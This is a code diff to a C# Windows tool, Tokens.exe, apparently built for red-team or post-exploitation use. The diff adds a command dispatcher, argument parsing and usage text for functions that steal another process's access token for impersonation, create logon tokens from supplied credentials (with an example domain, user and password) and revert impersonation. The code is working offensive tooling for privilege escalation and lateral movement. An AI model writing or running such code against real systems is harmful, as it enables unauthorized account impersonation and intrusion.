@@ -7,7 +7,46 @@ namespace Tokens
 {
     public class Program
     {
-        public static void Main(string[] args) { }
+        public static void Main(string[] args) {
+            if (args.Length < 1)
+            {
+                Usage();
+                return;
+            }
+            if (args[0] == "make_token")
+            {
+                make_token(args);
+            }
+            else if (args[0] == "steal_token")
+            {
+                steal_token(args);
+            }
+            else if (args[0] == "get_token")
+            {
+                get_token();
+            } 
+            else if (args[0] == "rev2self")
+            {
+                rev2self();
+            } else {
+                Usage();
+            }
+        }
+
+        public static void Usage()
+        {
+            Console.WriteLine("Usage:   Tokens.exe <function> [args]\n");
+            Console.WriteLine("Usage:   Tokens.exe steal_token <pid>");
+            Console.WriteLine("Usage:   Tokens.exe make_token <domain> <username> <password>");
+            Console.WriteLine("Usage:   Tokens.exe list_tokens");
+            Console.WriteLine("Usage:   Tokens.exe whoami");
+            Console.WriteLine("Usage:   Tokens.exe rev2self\n");
+            Console.WriteLine("Example: Tokens.exe steal_token 4468");
+            Console.WriteLine("Example: Tokens.exe make_token rayke.local sknecht WeakPass!");
+            Console.WriteLine("Example: Tokens.exe list_tokens");
+            Console.WriteLine("Example: Tokens.exe whoami");
+            Console.WriteLine("Example: Tokens.exe rev2self");
+        }
 
         [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         extern static bool CloseHandle(IntPtr handle);
@@ -40,9 +79,22 @@ namespace Tokens
         }
         public static int make_token(string[] arguments)
         {
-            var domain = arguments[0];
-            var user = arguments[1];
-            var password = arguments[2];
+            var domain = "";
+            var user = "";
+            var password = "";
+            try
+            {
+                domain = arguments[1];
+                user = arguments[2];
+                password = arguments[3];
+            } 
+            catch
+            {
+                Console.WriteLine("Failed to parse arguments for Make_Token");
+                Usage();
+                return 0;
+            }
+
 
             if (LogonUser(user, domain, password, LogonProvider.LOGON32_LOGON_INTERACTIVE, LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out var hToken))
             {
@@ -106,7 +158,16 @@ namespace Tokens
         }
         public static int steal_token(string[] arguments)
         {
-            int pid = int.Parse(arguments[0]);
+            int pid = 0;
+            try
+            {
+                pid = int.Parse(arguments[1]);
+            } catch
+            {
+                Console.WriteLine("Failed to parse parameters for steal_token");
+                Usage();
+                return 0;
+            }
             Process process = Process.GetProcessById(pid);
             if (!OpenProcessToken(process.Handle, TokenAccessFlags.TOKEN_ALL_ACCESS, out var hToken))
             {
@@ -145,17 +206,19 @@ namespace Tokens
 
         [DllImport("advapi32.dll", SetLastError = true)]
         public static extern bool RevertToSelf();
-        public static int rev2self(string[] arguments)
+        public static int rev2self()
         {
 
             if (RevertToSelf())
             {
-                Console.WriteLine("Dropped impersonated tokens");
+                var current_identity = WindowsIdentity.GetCurrent().Name;
+                Console.WriteLine($"Dropped {current_identity} token, you are now {WindowsIdentity.GetCurrent().Name}");
                 return 0;
             }
             else
             {
-                Console.WriteLine("Failed to drop impersonated tokens");
+                var current_identity = WindowsIdentity.GetCurrent().Name;
+                Console.WriteLine($"Failed to drop impersonated token {current_identity}");
                 return -32600;
             }
         }
@@ -168,7 +231,7 @@ namespace Tokens
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool OpenThreadToken(IntPtr ThreadHandle, TokenAccessFlags DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
 
-        public static int get_token(string[] arguments)
+        public static int get_token()
         {
             IntPtr tHandle = GetCurrentThread();
             if (!OpenThreadToken(tHandle, TokenAccessFlags.TOKEN_READ | TokenAccessFlags.TOKEN_IMPERSONATE, true, out IntPtr hToken))
